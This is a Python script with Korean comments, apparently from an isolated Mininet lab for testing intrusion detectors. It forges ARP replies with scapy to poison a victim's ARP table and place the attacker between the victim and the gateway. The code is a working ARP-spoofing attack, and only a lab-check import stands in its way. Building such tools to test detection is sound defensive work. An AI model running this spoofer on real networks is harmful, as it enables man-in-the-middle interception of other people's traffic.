"""ARP 스푸핑 (w07) — 격리 실험용.

공격자가 "<spoof-ip>의 MAC은 나(공격자)다"라는 ARP 응답을 피해자에게 반복해서 보냅니다.
피해자의 ARP 표가 오염되어, 피해자가 게이트웨이로 보내는 트래픽이 공격자를 거치게 됩니다(중간자).

이 스크립트는 패킷을 "보내기만" 합니다. 가로챈 트래픽을 전달·수정·저장하지 않습니다.
탐지기(규칙·AI)가 이 ARP 패턴을 잡는지 보는 것이 목적입니다.

run.py가 Mininet 공격자 호스트 안에서 실행합니다. 직접 실행은 labguard가 막습니다.

    python env/attacks/arp_spoof.py --spoof-ip 10.0.0.254 --victim-ip 10.0.0.1 \
        --iface h4-eth0 --rate 1 --duration 60
"""

from __future__ import annotations

import argparse
import time

from env.attacks.labguard import require_lab


def run(iface: str, spoof_ip: str, victim_ip: str | None,
        rate: float, duration: float, gratuitous: bool) -> None:
    from scapy.all import ARP, Ether, get_if_hwaddr, sendp  # 네임스페이스 안에서 import

    my_mac = get_if_hwaddr(iface)
    # op=2 (is-at): "spoof_ip는 my_mac에 있다"는 거짓 응답
    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff" if victim_ip is None else None)
    arp = ARP(op=2, hwsrc=my_mac, psrc=spoof_ip)
    if victim_ip is not None:
        arp.pdst = victim_ip          # 특정 피해자에게
    if gratuitous:
        arp.pdst = spoof_ip           # gratuitous: 보낸 IP = 찾는 IP
    frame = pkt / arp

    interval = 1.0 / rate if rate > 0 else 0.0
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        sendp(frame, iface=iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)
    print(f"arp_spoof 끝: {sent}개 전송 (iface={iface}, spoof={spoof_ip})")


def main() -> None:
    require_lab()
    p = argparse.ArgumentParser(description="ARP 스푸핑 (격리 실험용)")
    p.add_argument("--iface", required=True, help="공격자 인터페이스 (예: h4-eth0)")
    p.add_argument("--spoof-ip", required=True, help="사칭할 IP (보통 게이트웨이)")
    p.add_argument("--victim-ip", default=None, help="피해자 IP (없으면 브로드캐스트)")
    p.add_argument("--rate", type=float, default=1.0, help="초당 패킷 수 (느린 공격이면 낮춤)")
    p.add_argument("--duration", type=float, default=60.0)
    p.add_argument("--gratuitous", action="store_true", help="Gratuitous ARP로 보냄")
    a = p.parse_args()
    run(a.iface, a.spoof_ip, a.victim_ip, a.rate, a.duration, a.gratuitous)


if __name__ == "__main__":
    main()
